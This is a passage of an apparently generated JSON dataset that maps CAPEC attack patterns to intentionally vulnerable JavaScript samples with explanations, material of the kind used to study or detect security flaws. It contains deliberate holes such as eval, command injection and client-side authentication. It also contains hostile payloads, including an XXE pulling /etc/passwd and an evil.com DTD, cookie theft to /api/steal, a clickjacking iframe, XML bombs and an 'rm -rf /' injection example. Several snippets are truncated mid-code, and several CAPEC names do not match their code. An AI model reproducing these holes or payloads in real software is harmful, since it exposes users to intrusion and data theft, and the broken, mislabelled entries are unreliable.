        "code_snippet": "// Malicious overlay webpage\nconst overlay = document.createElement('iframe');\noverlay.style.position = 'absolute';\noverlay.style.top = '0';\noverlay.style.left = '0';\noverlay.style.width = '100%';\noverlay.style.height = '100%';\noverlay.style.opacity = '0.01';\noverlay.style.zIndex = '9999';\noverlay.src = 'https://attacker-site.com/fake-login';\ndocument.body.appendChild(overlay);\n\n// Track mouse position and move malicious iframe\ndocument.addEventListener('mousemove', (e) => {\n    const target = document.elementFromPoint(e.clientX, e.clientY);\n    if(target && target.tagName === 'BUTTON') {\n        overlay.style.top = target.offsetTop + 'px';\n        overlay.style.left = target.offsetLeft + 'px';\n        overlay.style.width = target.offsetWidth + 'px';\n        overlay.style.height = target.offsetHeight + 'px';\n    }\n});",
        "description": "This code creates an almost invisible iframe overlay that follows clickable elements on the legitimate page. When users try to interact with the legitimate site, their clicks are actually captured by the malicious overlay iframe, potentially redirecting their actions to an attacker-controlled site. The iframe's opacity is set very low to make it nearly invisible, and it tracks mouse movement to position itself over legitimate UI elements."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "const systemInfo = {\n    os: navigator.platform,\n    browser: navigator.userAgent,\n    language: navigator.language,\n    plugins: navigator.plugins,\n    screenResolution: `${window.screen.width}x${window.screen.height}`,\n    debugMode: window.localStorage.getItem('debug_enabled'),\n    systemVersion: process.version\n};\n\nfunction exposeSystemDetails() {\n    const sensitiveData = JSON.stringify(systemInfo, null, 2);\n    const debugEndpoint = 'http://external-logging.com/collect';\n    \n    fetch(debugEndpoint, {\n        method: 'POST',\n        body: sensitiveData,\n        credentials: 'include'\n    });\n\n    console.debug('System Information:', sensitiveData);\n    return sensitiveData;\n}",
        "description": "This code collects and exposes sensitive system information including OS details, browser information, installed plugins, and debug settings. It demonstrates vulnerability to system fingerprinting by gathering identifiable system characteristics and sending them to an external endpoint, potentially allowing attackers to profile the system and discover exploitable weaknesses."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "// Server-side code\napp.post('/login', (req, res) => {\n    const user = authenticateUser(req.body.username, req.body.password);\n    if (user) {\n        // Create session without invalidating existing ones\n        const sessionId = Math.random().toString(36);\n        res.cookie('sessionId', sessionId, {\n            httpOnly: false,\n            secure: false,\n            maxAge: 365 * 24 * 60 * 60 * 1000  // 1 year expiration\n        });\n        res.cookie('userRole', user.role, {\n            httpOnly: false\n        });\n        // No server-side session validation\n        res.json({ success: true });\n    }\n});\n\n// Client-side code\nfunction checkAuthorization() {\n    const userRole = getCookie('userRole');\n    if (userRole === 'admin') {\n        return true;\n    }\n    return false;\n}",
        "description": "This vulnerable code demonstrates multiple session management issues: it doesn't invalidate existing sessions during login, uses client-side authentication checks, sets cookies without secure flags, uses excessive session timeouts, and lacks server-side session validation. The cookies are also directly used for authorization without proper integrity checking."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "function processUserRequest(userData) {\n  let results = [];\n  while (true) {\n    let resource = new Array(1000000).fill('x');\n    let computation = userData.data.split('').reduce((acc, char) => {\n      return acc + char.charCodeAt(0).toString(2);\n    }, '');\n    results.push(resource);\n    if (resource.length > 0) {\n      setTimeout(() => {\n        processUserRequest(userData);\n      }, 100);\n    }\n  }\n  return results;\n}\n\napp.post('/api/process', (req, res) => {\n  processUserRequest(req.body);\n});",
        "description": "Vulnerable code that creates a recursive resource-consuming function without proper limits or authorization. It continuously allocates large arrays, performs CPU-intensive string operations, and recursively calls itself through setTimeout. The function never releases resources and can be triggered by any user without authentication, leading to resource exhaustion."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "const xml = require('xml2js');\nconst parser = new xml.Parser();\n\nfunction processXMLDocument(xmlString) {\n    // Vulnerable: No DTD validation or entity expansion limits\n    parser.parseString(xmlString, (err, result) => {\n        if (err) {\n            console.error(err);\n            return;\n        }\n        processResult(result);\n    });\n}\n\nconst maliciousXML = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n    <!ENTITY lol \"lol\">\n    <!ENTITY lol1 \"&lol;&lol;&lol;&lol;\">\n    <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;\">\n    <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;\">\n    <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;\">\n]>\n<foo>&lol4;</foo>`;\n\nprocessXMLDocument(maliciousXML);",
        "description": "This code demonstrates a vulnerable XML parser implementation that doesn't restrict entity expansion or validate DTDs. It accepts and processes XML input without proper controls, making it susceptible to XML entity expansion attacks (billion laughs attack) and potentially allowing inclusion of external entities. The parser doesn't implement any safeguards against recursive entity references or external DTD inclusions, which could lead to denial of service through resource exhaustion."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "`\nconst yaml = require('js-yaml');\nconst fs = require('fs');\n\nfunction parseUserConfig(inputFile) {\n    try {\n        const fileContent = fs.readFileSync(inputFile, 'utf8');\n        const config = yaml.load(fileContent, { schema: yaml.DEFAULT_FULL_SCHEMA",
        "description": "\"This code demonstrates a vulnerable YAML parser implementation that processes user-provided configuration files without proper resource limitations. It recursively processes nested objects without depth limits, allowing attackers to create deeply nested YAML files that can cause CPU exhaustion. The code also uses the DEFAULT_FULL_SCHEMA which enables potentially dangerous YAML features and external entity resolution.\""
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "function parseXMLDocument(xmlString) {\n    const parser = new DOMParser();\n    try {\n        const entities = {};\n        for(let i = 0; i < 100; i++) {\n            entities[`entity${i}`] = `&entity${i-1};Value${i}`;\n        }\n        \n        const xmlHeader = '<?xml version=\"1.0\"?><!DOCTYPE root [';\n        const entityDefs = Object.entries(entities)\n            .map(([key, value]) => `<!ENTITY ${key} \"${value}\">`)\n            .join('');\n        const xmlFooter = ']><root>&entity99;</root>';\n        \n        const maliciousXML = xmlHeader + entityDefs + xmlFooter;\n        const doc = parser.parseFromString(maliciousXML, 'text/xml');\n        return doc;\n    } catch(e) {\n        return null;\n    }\n}",
        "description": "This vulnerable code demonstrates an XML billion laughs attack by creating deeply nested entity references without proper validation or resource limits. It accepts untrusted XML input, creates recursive entity definitions, and attempts to parse them without schema validation or resource constraints, potentially leading to exponential memory consumption and CPU exhaustion."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "const parseXMLData = (xmlString) => {\n    let parser = new DOMParser();\n    try {\n        // No validation of input size or structure\n        let serializedData = JSON.parse(xmlString);\n        let result = [];\n        \n        function recursiveParse(obj) {\n            // Uncontrolled recursion with no depth limit\n            for(let key in obj) {\n                if(typeof obj[key] === 'object') {\n                    recursiveParse(obj[key]);\n                }\n                result.push(obj[key]);\n            }\n        }\n        \n        // Process potentially malicious oversized payload\n        let xmlDoc = parser.parseFromString(xmlString, 'text/xml');\n        let jsonData = serializedData;\n        recursiveParse(jsonData);\n        \n        return result;\n    } catch(e) {\n        return null;\n    }\n}",
        "description": "This vulnerable code accepts XML data without validation, attempts to parse it as both XML and JSON, and processes it recursively without any depth limits or resource constraints. It's susceptible to XML bomb attacks, stack overflow through excessive recursion, and memory exhaustion through oversized payloads."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "class AccessControl {\n  constructor() {\n    this.userPrivileges = new Map();\n    this.isCheckingPrivileges = false;\n  }\n\n  setUserPrivilege(userId, level) {\n    this.userPrivileges.set(userId, level);\n  }\n\n  async performAction(userId, action) {\n    this.isCheckingPrivileges = true;\n    \n    setTimeout(() => {\n      // Async privilege check that can be bypassed\n      this.isCheckingPrivileges = false;\n    }, 1000);\n\n    // Race condition: Data channel proceeds before control channel completes\n    if (!this.isCheckingPrivileges) {\n      const userLevel = this.userPrivileges.get(userId) || 0;\n      \n      // Improper privilege check\n      if (userLevel > 0) {\n        return action();\n      }\n    }\n\n    throw new Error('Unauthorized');\n  }\n}\n\nconst ac = new AccessControl();\nac.setUserPrivilege('user1', 1);\nac.performAction('user1', () => {\n  // Privileged operation\n  console.log('Accessing sensitive data');\n});",
        "description": "This vulnerable code demonstrates improper privilege management and race conditions in security checks. The AccessControl class implements a flawed privilege checking mechanism where the control channel (privilege verification) can be de-synchronized from the data channel (action execution) due to asynchronous operations. The code also shows improper isolation of privileged operations and insufficient handling of privilege checks, allowing potential privilege escalation."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "// Vulnerable process management code\nconst child_process = require('child_process');\nconst fs = require('fs');\n\nfunction runPrivilegedOperation(userInput) {\n    // Incorrect privilege management - running with root/admin rights\n    process.setuid(0);\n\n    // Unsafe execution of user input with elevated privileges\n    let cmd = userInput;\n    child_process.exec(cmd, (error, stdout, stderr) => {\n        // Write results to sensitive system file\n        fs.writeFileSync('/etc/system.conf', stdout);\n    });\n\n    // Never drops privileges after operation\n    // process.setuid(normalUserId); // Missing privilege drop\n}",
        "description": "This code demonstrates privilege escalation vulnerability through incorrect privilege management and unsafe command execution. It elevates privileges to root, executes untrusted user input with those privileges, writes to a sensitive system file, and fails to drop privileges afterward. The code violates secure coding practices by running with unnecessary elevated privileges and not properly handling privilege dropping."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "`\nclass UserAuthentication {\n  static sessionToken = null;\n\n  static async authenticate(username, password) {\n    const token = await fetchTokenFromServer(username, password);\n    this.sessionToken = token;",
        "description": "\"A vulnerable authentication system that uses static variables in a multi-threaded context, making it susceptible to capture-replay attacks and race conditions. The static sessionToken can be accessed and modified by multiple threads without proper synchronization, and the simple token comparison makes it vulnerable to replay attacks.\""
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  let authToken = '';\n  socket.on('data', (data) => {\n    // Vulnerable capture-replay authentication\n    if (!authToken) {\n      authToken = data.toString();\n      socket.write('Authenticated\\n');\n    } else {\n      // Reuse of captured token allows replay\n      if (data.toString() === authToken) {\n        socket.write('Access granted\\n');\n        handlePrivilegedOperation(socket);\n      }\n    }\n  });\n\n  function handlePrivilegedOperation(socket) {\n    try {\n      // Unsafe signal handler that can be interrupted\n      process.on('SIGUSR1', () => {\n        // Non-reentrant code\n        socket.write('Processing privileged operation\\n');\n        // Critical section that could be interrupted\n        globalState.sensitive = 'exposed';\n      });\n    } catch(e) {\n      // Unchecked error condition\n    }\n  }\n});\n\nserver.listen(3000);",
        "description": "This code demonstrates a vulnerable authentication system that is susceptible to capture-replay attacks. It uses a simple token-based authentication without any timestamp or nonce protection. The code also includes an unsafe signal handler that can be interrupted during execution, and unchecked error conditions. The privileged operation handler can be hijacked due to poor access control and non-reentrant code."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "class Sandbox {\n    constructor() {\n        this.nativeModule = require('node-gyp-build')('../native');\n    }\n\n    executeUserCode(userCode) {\n        try {\n            // Attempt to execute user-provided code in sandbox\n            const vm = require('vm');\n            const sandbox = {\n                nativeModule: this.nativeModule,\n                Buffer: Buffer,\n                process: process\n            };\n            vm.createContext(sandbox);\n            return vm.runInContext(userCode, sandbox);\n        } catch(e) {\n            console.error(`Error details: ${e.stack}`);\n        }\n    }\n\n    callNativeFunction() {\n        return this.nativeModule.unsafeOperation();\n    }\n}",
        "description": "This code demonstrates a vulnerable sandbox implementation where untrusted code can access native system functionality through the exposed Node.js native modules. The sandbox fails to properly isolate user code and allows access to sensitive native operations through the nativeModule object. Additionally, the error handling exposes sensitive stack trace information."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "// Constants defined in multiple places without centralization\nconst ADMIN_ROLE = 'admin';\n\nfunction parseURL(url) {\n    // Authorization check before proper URL parsing\n    if (checkUserRole() === ADMIN_ROLE) {\n        let parsedUrl = url;\n        // Inadequate URL parsing\n        if (parsedUrl.includes('admin')) {\n            return true;\n        }\n    }\n    return false;\n}\n\nfunction checkUserRole() {\n    // Duplicate constant definition\n    const ADMIN_ROLE = 'admin';\n    return currentUser.role;\n}\n\nfunction accessResource(path) {\n    // Improper path traversal protection\n    if (parseURL('/admin/' + path)) {\n        // Alternative paths not properly secured\n        return loadResource(path);\n    } else if (path.includes('../admin')) {\n        // Incorrect control flow allows bypass\n        return loadResource(path.replace('../', ''));\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including authorization checks before proper URL parsing, inconsistent symbolic constant definitions, improper path traversal protection, and insufficient protection of alternate paths to access resources. The control flow implementation is flawed, allowing potential security bypasses."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "// Client-side authentication logic\nclass UserAuth {\n    constructor() {\n        this.isAuthenticated = false;\n    }\n\n    login(username, password) {\n        // Client-side only authentication\n        if (username === 'admin' && password === 'password123') {\n            this.isAuthenticated = true;\n            localStorage.setItem('auth_token', 'secretToken123');\n            return true;\n        }\n        return false;\n    }\n\n    checkAccess() {\n        // Client-side security check\n        return localStorage.getItem('auth_token') === 'secretToken123';\n    }\n\n    performSecureOperation() {\n        if (this.checkAccess()) {\n            // Sensitive operation\n            fetch('/api/sensitiveData', {\n                headers: {\n                    'auth-token': localStorage.getItem('auth_token')\n                }\n            });\n        }\n    }\n}",
        "description": "This vulnerable code implements authentication entirely on the client side, storing authentication state in localStorage and performing security checks within the browser. An attacker can bypass these controls by modifying the client-side code or directly manipulating localStorage values to gain unauthorized access to server resources."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "function loadUserProfile(userId) {\n    let resourcePath = './profiles/' + userId + '.json';\n    let profile = require(resourcePath);\n    \n    // Load additional user data\n    let customDataPath = profile.customDataLocation;\n    let additionalData = require(customDataPath);\n    \n    return {\n        ...profile,\n        additionalData\n    };\n}",
        "description": "This code is vulnerable to resource injection as it directly uses user input to construct file paths without validation or sanitization. An attacker could manipulate the userId parameter to traverse directories or access arbitrary files using path traversal sequences. The code also loads additional resources based on paths from the initial profile, creating a second injection point."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "function authenticateUser(username, password) {\n  // Using deprecated authentication method\n  if (escape(username) === 'admin' && unescape(password) === 'pass123') {\n    // Using obsolete file handling method\n    var file = new ActiveXObject('Scripting.FileSystemObject');\n    var tempFile = file.OpenTextFile('C:/temp/auth.log', 8, true);\n    tempFile.WriteLine('User authenticated: ' + username);\n    tempFile.Close();\n    \n    // Dynamic class loading via eval\n    var userClass = 'function User() { this.name = \"' + username + '\"; }';\n    eval(userClass);\n    return new User();\n  }\n  return false;\n}",
        "description": "This code demonstrates multiple vulnerabilities including use of deprecated authentication mechanisms, obsolete functions (escape/unescape), unsafe dynamic code execution through eval(), and insecure file handling using old ActiveX objects. The code is susceptible to code injection attacks due to unsanitized user input being used in eval() and file operations."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "function processUserCode(userInput) {\n    let result;\n    try {\n        result = eval(userInput);\n        document.getElementById('output').innerHTML = result;\n    } catch(e) {\n        console.log('Error processing code: ' + e);\n    }\n}\n\n// Example usage\nlet userSubmittedCode = document.getElementById('codeInput').value;\nprocessUserCode(userSubmittedCode);",
        "description": "This code demonstrates a dynamic code execution vulnerability where user-supplied input is directly evaluated using eval(), allowing arbitrary JavaScript code execution. The code lacks proper input validation and sanitization, making it susceptible to code injection attacks. An attacker could input malicious JavaScript code that would be executed in the context of the application."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "function displayUserProfile(userInput) {\n    let profileDiv = document.getElementById('profile');\n    profileDiv.innerHTML = '<a href=\"#\" style=\"' + userInput + '\">User Profile</a>';\n    profileDiv.innerHTML += '<img src=\"avatar.jpg\" onmouseover=\"' + userInput + '\" />';\n    profileDiv.innerHTML += '<div style=\"background:url(' + userInput + ')\">' + userInput + '</div>';\n}",
        "description": "This vulnerable code directly embeds user input into HTML attributes (style, onmouseover) and tag content without sanitization, allowing for XSS attacks through attribute injection. An attacker could inject malicious JavaScript through style attributes or event handlers."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "function displayUserProfile(userId) {\n    let userProfile = getUserProfile(userId);\n    let template = `\n        <div class='profile'>\n            <h2>${userProfile.name}</h2>\n            <img src='${userProfile.avatar}' onerror='javascript:alert(document.cookie)'>\n            <a href='javascript:void(0)' onclick='${userProfile.customJs}'>View Details</a>\n            <div style='background-image: url(javascript:fetch(`/api/steal?data=${document.cookie}`))'></div>\n            <iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+'></iframe>\n        </div>\n    `;\n    document.getElementById('profileContainer').innerHTML = template;\n}",
        "description": "This code demonstrates multiple XSS vulnerabilities through unsafe handling of URIs and HTML attributes. It includes unvalidated user input in img src attributes, javascript: URI schemes, base64 encoded malicious content, and unsafe inline event handlers. The code allows for script execution through various HTML tag attributes and URI schemes."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "function validateUserInput(input) {\n    // Vulnerable validation that fails to catch doubled characters\n    if (!input.includes('<script>')) {\n        // Basic check passes if input doesn't contain exact '<script>' pattern\n        return input;\n    }\n    return '';\n}\n\n// Example usage in a web context\napp.get('/display', function(req, res) {\n    let userInput = req.query.message;\n    let sanitized = validateUserInput(userInput);\n    // Vulnerable: directly inserting potentially unsafe content\n    res.send(`<div>${sanitized}</div>`);\n});",
        "description": "This code demonstrates a vulnerable input validation function that can be bypassed using doubled characters. The validation only checks for exact '<script>' pattern, allowing malicious input like '<<script>' or '%3C%3Cscript>' to pass through. The sanitized content is then directly inserted into HTML output, enabling XSS attacks."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "function displayUserImage(userInput) {\n  let imageDiv = document.createElement('div');\n  let blacklist = ['<script>', 'javascript:', 'onerror'];\n  \n  // Incomplete denylist implementation\n  blacklist.forEach(term => {\n    userInput = userInput.replace(term, '');\n  });\n\n  // Vulnerable IMG tag with unsanitized input\n  imageDiv.innerHTML = `<img src=\"${userInput}\" class=\"user-image\">`;\n  document.body.appendChild(imageDiv);\n\n  // Permissive cross-domain policy\n  let crossDomainPolicy = '<?xml version=\"1.0\"?>\\n' +\n    '<cross-domain-policy>\\n' +\n    '  <allow-access-from domain=\"*\" />\\n' +\n    '</cross-domain-policy>';\n}",
        "description": "This vulnerable code demonstrates multiple XSS vulnerabilities through inadequate input sanitization for image tags. It uses an incomplete blacklist that can be bypassed using alternate syntax or doubled characters, and implements an overly permissive cross-domain policy. The code accepts unsanitized user input directly into an IMG tag's attributes, potentially allowing script execution through attributes like onerror."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "function displayUserComment(comment) {\n    let sanitized = comment.replace(/[<>]/g, '');\n    // Vulnerable: Doesn't handle null bytes or doubled characters\n    // Attacker can use: \"<scr\\0ipt>alert(1)</script>\" or \"<sscriptcript>alert(1)</sscriptcript>\"\n    document.getElementById('comments').innerHTML = sanitized;\n}",
        "description": "This code attempts to sanitize user input by removing < and > characters but fails to account for null bytes, doubled characters, and other invalid character sequences. An attacker can bypass the filter by using null bytes or character doubling to inject malicious scripts that will be processed by the browser."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "function executeCommand(userInput) {\n  const command = 'mysql -u admin -p' + userInput;\n  const exec = require('child_process').exec;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error}`);\n      return;\n    }\n    console.log(`Output: ${stdout}`);\n  });\n}",
        "description": "A vulnerable function that directly concatenates user input into a command string without sanitization, allowing command injection through shell metacharacters. An attacker could input malicious strings like '; rm -rf /' to execute arbitrary commands."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "const userInput = req.params.command;\nconst exec = require('child_process').exec;\n\nfunction executeCommand(cmd) {\n    exec(cmd, (error, stdout, stderr) => {\n        console.log(stdout);\n    });\n}\n\nfunction processTerminalCommand(input) {\n    // Vulnerable: Direct use of user input in terminal command\n    executeCommand('echo ' + input);\n}",
        "description": "A vulnerable terminal command execution function that takes user input directly from request parameters and passes it to a shell command without any sanitization, allowing command injection through special characters and shell operators."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "function getUserProfile(userInput) {\n  const xml = `\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <users>\n      <user>\n        <username>admin</username>\n        <password>secret123</password>\n      </user>\n    </users>\n  `;\n  \n  const parser = new DOMParser();\n  const xmlDoc = parser.parseFromString(xml, 'text/xml');\n  \n  // Vulnerable XPath query construction using raw user input\n  const xpath = `//user[username/text()='${userInput}']`;\n  const result = document.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE, null);\n  \n  return result.iterateNext()?.textContent;\n}",
        "description": "This code demonstrates an XML injection vulnerability by directly embedding user input into an XPath query without proper sanitization. An attacker could inject malicious XPath expressions like \"' or '1'='1\" to bypass authentication or extract unauthorized data from the XML database."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "// Global configuration object\nlet CONFIG = {\n    libraryPath: './libs/',\n    isInitialized: false\n};\n\n// Dynamic library loader\nfunction loadLibrary(libraryName) {\n    let libPath = CONFIG.libraryPath + libraryName;\n    try {\n        // Unsafe dynamic require of arbitrary files\n        let lib = require(libPath);\n        global.loadedLib = lib;\n        \n        // Unsafe modification of global execution context\n        if(lib.initialize) {\n            global.execute = lib.initialize;\n            global.execute();\n        }\n        \n        return lib;\n    } catch(e) {\n        // Fallback to potentially vulnerable older version\n        let fallbackPath = CONFIG.libraryPath + 'legacy/' + libraryName;\n        return require(fallbackPath);\n    }\n}",
        "description": "This code demonstrates vulnerable dynamic library loading where arbitrary files can be loaded from the local filesystem. It uses global variables unsafely, relies on machine-dependent file paths, and allows dynamic execution of loaded code. The fallback mechanism could be exploited to load vulnerable legacy versions of libraries."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/load-module', (req, res) => {\n    const modulePath = req.query.path;\n    try {\n        const moduleContent = fs.readFileSync(modulePath);\n        const loadedModule = eval(moduleContent.toString());\n        res.send({ success: true, result: loadedModule });\n    } catch(err) {\n        res.send({ success: false, error: err.message });\n    }\n});",
        "description": "This vulnerable code allows arbitrary local file loading and execution through a query parameter. It directly uses user input to load and execute files without proper validation, making it susceptible to local file inclusion attacks and arbitrary code execution. The code also uses eval() to execute the loaded content, which is extremely dangerous."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "// Remote script loader with no integrity checks\nfunction loadRemoteScript(url) {\n    let script = document.createElement('script');\n    script.src = url;\n    script.async = true;\n    document.head.appendChild(script);\n}\n\n// Application configuration\nconst config = {\n    libraryPath: 'http://external-cdn.example.com/libs/',\n    version: '1.0'\n};\n\n// Dynamically load required libraries\nfunction initializeApp() {\n    loadRemoteScript(config.libraryPath + 'jquery-' + config.version + '.js');\n    loadRemoteScript(config.libraryPath + 'analytics.js');\n    loadRemoteScript(config.libraryPath + 'utils.js');\n}\n\ninitializeApp();",
        "description": "This code demonstrates unsafe remote script loading without integrity checks or origin validation. It blindly loads JavaScript files from an external source, making it vulnerable to malicious code injection through compromised CDN or man-in-the-middle attacks. The version parameter could be manipulated to load outdated, vulnerable versions of libraries."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "const xml = `<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://evil.com/exploit.dtd\">%dtd;]><root>&data;</root>`;\n\nconst parser = new DOMParser();\nconst xmlDoc = parser.parseFromString(xml, 'text/xml');\n\n// Expose WSDL information\nconst wsdl = `<?xml version=\"1.0\"?>\n<wsdl:definitions xmlns:wsdl=\"http://schemas.xmlsoap.org/wsdl/\">\n    <wsdl:message name=\"credentials\">\n        <wsdl:part name=\"username\" type=\"xsd:string\"/>\n        <wsdl:part name=\"password\" type=\"xsd:string\"/>\n    </wsdl:message>\n</wsdl:definitions>`;\n\nconst debug = true;\nif (debug) {\n    console.log('XML Input:', xml);\n    console.log('WSDL Definition:', wsdl);\n}",
        "description": "This code demonstrates an XML parser vulnerability that allows DTD injection through unrestricted entity expansion. It includes an external entity reference that could lead to file disclosure and server-side request forgery. The code also exposes sensitive WSDL information and debug logs, making it vulnerable to information disclosure attacks."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "function processSOAPArray(request) {\n    const declaredLength = parseInt(request.headers['array-length']);\n    const actualData = request.body.data;\n    \n    // Allocate buffer based on declared length, not actual length\n    let buffer = Buffer.alloc(declaredLength);\n    \n    // Vulnerable: Copies data without checking actual length\n    for(let i = 0; i < actualData.length; i++) {\n        buffer[i] = actualData[i];\n    }\n    \n    return buffer;\n}",
        "description": "This code demonstrates a vulnerable SOAP array processing function that trusts the declared length in the request header without validating it against the actual data length. It allocates a buffer based on the declared length and attempts to copy the actual data without bounds checking, potentially leading to a buffer overflow if the actual data length exceeds the declared length."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "// Config settings and sensitive data directly in code\nconst config = {\n    dbPassword: 'admin123',\n    apiKey: 'sk_live_12345',\n    debug: true\n};\n\nfunction logUserActivity(userId, action) {\n    console.log(`User ${userId} performed ${action} at ${new Date()}`);\n    fs.appendFileSync('debug.log', `${userId}:${action}:${config.apiKey}\\n`);\n}\n\nfunction authenticateUser(username) {\n    // Bypass authentication if debug mode\n    if(config.debug) {\n        return true;\n    }\n    return checkCredentials(username);\n}",
        "description": "This code demonstrates multiple deprecated security issues including exposed sensitive data in logs, inadequate data protection, authentication bypass through debug flags, and insecure storage of configuration data. The code writes sensitive information to log files and includes a debug mode that bypasses authentication."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "// Client-side authentication implementation\nclass UserAuth {\n  constructor() {\n    this.token = null;\n  }\n\n  authenticate(username, password) {\n    // Perform authentication on client side only\n    const hash = btoa(username + ':' + password);\n    this.token = hash;\n    \n    // Send request to protected resource without server validation\n    fetch('https://api.example.com/sensitive-data', {\n      headers: {\n        'Authorization': 'Basic ' + this.token\n      }\n    }).then(response => {\n      localStorage.setItem('auth_token', this.token);\n      return response.json();\n    });\n  }\n\n  isAuthenticated() {\n    // Relies only on client-side token check\n    return localStorage.getItem('auth_token') !== null;\n  }\n}",
        "description": "This code demonstrates vulnerable client-side authentication where all authentication logic is performed in the client code, making it susceptible to capture-replay attacks and authentication bypass. The code stores authentication tokens in localStorage without server validation, and uses basic authentication headers that can be easily sniffed and replayed."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "// Client-side authentication implementation\nclass UserAuth {\n    constructor() {\n        this.authToken = null;\n    }\n\n    authenticate(username, password) {\n        // Vulnerable: Authentication performed only on client side\n        const token = btoa(username + ':' + password);\n        this.authToken = token;\n        \n        // Debug logging exposing sensitive information\n        console.log('Auth Token:', token);\n        \n        // Store token in localStorage for subsequent requests\n        localStorage.setItem('authToken', token);\n        \n        // Send request without server-side validation\n        return fetch('/api/data', {\n            headers: {\n                'Authorization': 'Basic ' + token\n            }\n        });\n    }\n\n    isAuthenticated() {\n        return !!this.authToken;\n    }\n}",
        "description": "This code demonstrates vulnerable client-side authentication where authentication logic is implemented only on the client side, making it susceptible to bypass. It includes storing sensitive authentication tokens in localStorage and debug logging, which can be captured and replayed by attackers. The implementation lacks server-side validation and relies solely on client-side state management."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "`\n    // Client-side authentication implementation\n    function authenticate(username, password) {\n      // Client-side only authentication check\n      if (username === 'admin' && password === 'secret123') {\n        localStorage.setItem('isAuthenticated', 'true');\n        return true;",
        "description": "\"This code demonstrates vulnerable client-side authentication that can be bypassed by modifying the client code, along with capture-replay vulnerability due to auth tokens being transmitted without proper protection. It also includes debug logging of sensitive authentication information.\""
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst db = mysql.createConnection({\n    host: 'localhost',\n    user: 'admin',\n    password: 'secretpass',\n    database: 'userdb'\n});\n\napp.get('/user', (req, res) => {\n    let userId = req.query.id;\n    let query = `SELECT * FROM users WHERE id = ${userId}`;\n    \n    try {\n        db.query(query, (err, result) => {\n            if (err) {\n                // Reveals detailed error information\n                res.status(500).json({\n                    error: err.message,\n                    query: query,\n                    stack: err.stack\n                });\n            } else {\n                res.json(result);\n            }\n        });\n    } catch (error) {\n        res.status(500).send(error.toString());\n    }\n});",
